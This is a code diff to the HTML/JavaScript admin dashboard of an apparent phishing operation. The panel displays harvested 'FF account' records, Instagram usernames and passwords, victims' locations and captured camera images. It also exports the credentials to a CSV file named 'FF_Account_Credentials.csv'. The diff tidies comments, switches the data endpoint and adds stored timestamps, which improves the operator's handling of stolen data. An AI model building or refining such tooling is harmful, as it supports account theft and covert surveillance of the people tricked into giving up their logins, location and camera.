@@ -27,7 +27,6 @@
             justify-content: center;
         }
 
-        /* Glassmorphism Login Container */
         .login-card {
             background: var(--card-bg);
             border: 1px solid var(--border);
@@ -111,7 +110,6 @@
             display: none;
         }
 
-        /* Dashboard Styles (Hidden Initially) */
         #dashboardContainer {
             display: none;
             width: 100%;
@@ -269,7 +267,6 @@
 </head>
 <body>
 
-    <!-- Glassmorphism Login Form -->
     <div id="loginCard" class="login-card">
         <h2>🔐 Admin Access</h2>
         <p>Please enter your credentials to view logs</p>
@@ -287,7 +284,6 @@
         </form>
     </div>
 
-    <!-- Main Dashboard (Protected) -->
     <div id="dashboardContainer">
         <h1>🔐 Admin Security Dashboard</h1>
         
@@ -296,14 +292,12 @@
             <button class="action-btn" onclick="logout()" style="border-color:#ff4757; color:#ff4757; background:rgba(255,71,87,0.1);">🔒 Logout</button>
         </div>
 
-        <!-- Tabs Navigation -->
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('ff-data', event)">🎮 FF Account Logs</button>
             <button class="tab-btn" onclick="switchTab('location-data', event)">📍 Location & Camera</button>
             <button class="tab-btn" onclick="switchTab('system-logs', event)">💻 System & Browser Logs</button>
         </div>
 
-        <!-- Section 1: FF Account Data -->
         <div id="ff-data" class="section-content active">
             <div class="card">
                 <div class="card-header-flex">
@@ -329,7 +323,6 @@
             </div>
         </div>
 
-        <!-- Section 2: Location & Camera -->
         <div id="location-data" class="section-content">
             <div class="card">
                 <div class="card-header-flex">
@@ -354,7 +347,6 @@
             </div>
         </div>
 
-        <!-- Section 3: System Logs -->
         <div id="system-logs" class="section-content">
             <div class="card">
                 <div class="card-header-flex">
@@ -382,7 +374,6 @@
     <script>
         let globalLogs = [];
 
-        // Check if already logged in via SessionStorage
         window.onload = function() {
             if (sessionStorage.getItem('admin_logged_in') === 'true') {
                 showDashboard();
@@ -424,16 +415,14 @@
         }
 
         function loadData() {
-            fetch('/api/get-logs')
+            fetch('/api/get-ff-data')
                 .then(res => res.json())
                 .then(data => {
                     globalLogs = data;
                     renderLogs(data);
                 })
                 .catch(err => {
-                    let localData = JSON.parse(localStorage.getItem('ff_collected_logs') || '[]');
-                    globalLogs = localData;
-                    renderLogs(localData);
+                    console.error("Failed to fetch from server:", err);
                 });
         }
 
@@ -455,7 +444,7 @@
 
             logs.forEach(item => {
                 let imgTag = item.image_base64 ? `<img src="${item.image_base64}" class="captured-img">` : 'No Image';
-                let timeStr = new Date().toLocaleTimeString();
+                let timeStr = item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
 
                 ffHtml += `
                     <tr>
@@ -506,7 +495,7 @@
             if (type === 'ff') {
                 csvContent += "Platform,Username_or_Email,Password_or_Selection,Time\r\n";
                 globalLogs.forEach(row => {
-                    csvContent += `"${row.platform || ''}","${row.instagram_username || ''}","${row.instagram_password || ''}","${new Date().toLocaleString()}"\r\n`;
+                    csvContent += `"${row.platform || ''}","${row.instagram_username || ''}","${row.instagram_password || ''}","${row.timestamp || ''}"\r\n`;
                 });
                 filename = "FF_Account_Credentials.csv";
             } else if (type === 'location') {
